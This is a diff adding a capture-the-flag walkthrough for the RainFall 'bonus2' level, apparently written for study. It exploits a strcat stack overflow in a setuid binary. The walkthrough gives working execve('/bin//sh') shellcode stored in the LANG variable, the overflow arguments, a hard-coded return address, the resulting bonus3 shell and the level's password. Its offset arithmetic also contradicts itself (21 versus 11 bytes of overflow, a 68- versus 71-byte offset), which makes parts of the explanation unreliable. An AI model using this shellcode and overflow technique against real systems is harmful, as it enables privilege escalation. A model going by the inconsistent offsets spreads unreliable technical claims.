@@ -1,0 +1,184 @@
+# Bonus2 - Environment Variable + strcat Buffer Overflow Walkthrough
+
+## Binary Analysis
+```bash
+bonus2@RainFall:~$ file bonus2
+bonus2: setuid setgid ELF 32-bit LSB executable, Intel 80386, dynamically linked
+
+bonus2@RainFall:~$ ./bonus2 user1 user2
+Hello user1  # Normal behavior - concatenates args with greeting
+```
+
+## Vulnerability Discovery
+
+### Initial Testing
+```bash
+# Test with long arguments
+bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 32')
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+Segmentation fault (core dumped)
+```
+
+### GDB Analysis
+```bash
+gdb -q bonus2
+(gdb) info functions
+# Shows: main, greetuser functions
+(gdb) disas main
+# Reveals: strncpy calls, getenv("LANG"), language detection
+(gdb) disas greetuser  
+# Shows: strcpy + strcat vulnerability
+```
+
+## Root Cause Analysis
+
+### The Language Detection System
+```c
+// Program checks LANG environment variable:
+if (memcmp(env_lang, "fi", 2) == 0)      // Finnish
+    lang = 1;
+else if (memcmp(env_lang, "nl", 2) == 0) // Dutch  
+    lang = 2;
+else                                     // English (default)
+    lang = 0;
+```
+
+### The Critical Vulnerability
+```c
+// In greetuser():
+char greeting[64];               // 64-byte buffer
+strcpy(greeting, "Hyvää päivää "); // 13 bytes (Finnish)
+strcat(greeting, user);          // UNSAFE: No bounds checking!
+```
+
+### Buffer Overflow Mechanics
+- **Combined Input**: 40 bytes (argv[1]) + 32 bytes (argv[2]) = 72 bytes
+- **Greeting Buffer**: 64 bytes  
+- **Finnish Greeting**: "Hyvää päivää " (13 bytes) + user (72 bytes) = 85 bytes
+- **Overflow**: 85 - 64 = 21 bytes overflow into return address!
+
+## Memory Layout Analysis
+
+### Stack Layout in greetuser()
+```
+Higher Memory Addresses
+┌─────────────────────────────────────┐
+│ Return Address                     │ ← TARGET (EBP + 4)
+├─────────────────────────────────────┤
+│ Saved EBP                          │ ← EBP  
+├─────────────────────────────────────┤
+│ greeting[64] buffer                │ ← EBP - 0x48
+│ "Hyvää päivää " + user data        │
+└─────────────────────────────────────┘
+Lower Memory Addresses
+
+Overflow: greeting[64] + 21 bytes overflow → return address
+```
+
+### Payload Construction
+```bash
+# Total user data: 72 bytes
+# Overflow calculation: 72 + 13 - 64 = 21 bytes past buffer
+# Return address position: 64 + 4 (saved EBP) = 68 bytes from buffer start
+# Need 18 bytes of data + return address (4 bytes)
+```
+
+## Exploitation Strategy
+
+### Step 1: Environment Variable Shellcode Storage
+```bash
+# Store shellcode in LANG environment variable with Finnish prefix
+export LANG=$(python -c 'print("fi" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
+
+# Components:
+# "fi"          - Triggers Finnish language (13-byte greeting)
+# "\x90" * 100  - NOP slide (large target area)  
+# shellcode     - execve("/bin//sh") system call
+```
+
+### Step 2: Find Environment Variable Address
+```gdb
+# In GDB, find LANG variable location:
+(gdb) x/40s *((char**)environ)
+# Shows: 0xbffffeb5: "LANG=fi\220\220\220..."
+# Shellcode starts at: 0xbffffeb5 + 7 (after "LANG=fi")
+# Target address: 0xbffffeb5 + 7 + 42 = 0xbffffeec (middle of NOP slide)
+```
+
+### Step 3: Craft Overflow Arguments
+```bash
+# Argument 1: Fill first part of buffer
+$(python -c 'print "A" * 40')
+
+# Argument 2: Padding + return address  
+$(python -c 'print "B" * 18 + "\xec\xfe\xff\xbf"')
+
+# Layout after strcat:
+# "Hyvää päivää " (13) + "A"*40 + "B"*18 + return_addr
+# Total: 13 + 40 + 18 + 4 = 75 bytes
+# Overflow: 75 - 64 = 11 bytes past buffer (overwrites return address)
+```
+
+## Shellcode Analysis
+```assembly
+\x6a\x0b       ; push 0x0b        - execve syscall number
+\x58           ; pop eax          - eax = 11 (execve)
+\x99           ; cdq              - edx = 0 (envp)
+\x52           ; push edx         - push NULL
+\x68\x2f\x2f\x73\x68 ; push "//sh" - push "//sh"  
+\x68\x2f\x62\x69\x6e ; push "/bin" - push "/bin"
+\x89\xe3       ; mov ebx, esp     - ebx = "/bin//sh"
+\x31\xc9       ; xor ecx, ecx     - ecx = 0 (argv)
+\xcd\x80       ; int 0x80        - execute syscall
+```
+
+## Complete Exploit Execution
+
+### Final Command Sequence
+```bash
+# Step 1: Store shellcode in environment
+export LANG=$(python -c 'print("fi" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
+
+# Step 2: Trigger overflow with correct return address  
+./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\xec\xfe\xff\xbf"')
+```
+
+### Execution Result
+```bash
+bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\xec\xfe\xff\xbf"')
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB����
+$ whoami
+bonus3
+$ id  
+uid=2012(bonus2) gid=2012(bonus2) euid=2013(bonus3) egid=100(users) groups=2013(bonus3),100(users),2012(bonus2)
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+```
+
+## Attack Flow Summary
+
+1. **Environment Setup**: Store shellcode in LANG variable with "fi" prefix
+2. **Language Trigger**: "fi" prefix activates Finnish greeting (longer string)
+3. **Buffer Overflow**: Combined 72-byte user input + 13-byte greeting exceeds 64-byte buffer
+4. **Return Address Overwrite**: Last 4 bytes overwrite return address with NOP slide location
+5. **Shell Execution**: CPU jumps to NOP slide → slides to shellcode → execve("/bin//sh")
+6. **Privilege Escalation**: SUID binary grants bonus3 privileges
+
+## Flag Retrieved
+```
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+```
+
+## Key Learning Points
+
+### Attack Innovation
+- **Environment Variable Storage**: Using LANG for shellcode storage 
+- **Language Exploitation**: Abusing localization for longer overflow
+- **Address Calculation**: Dynamic environment address discovery
+- **Two-Stage Payload**: Environment storage + overflow trigger
+
+### Security Lessons
+- **Dangerous String Functions**: strcat() without bounds checking
+- **Environment Risks**: User-controlled environment variables as attack vectors
+- **Localization Vulnerabilities**: Different string lengths create overflow opportunities
+- **SUID Dangers**: Elevated privileges amplify exploitation impact
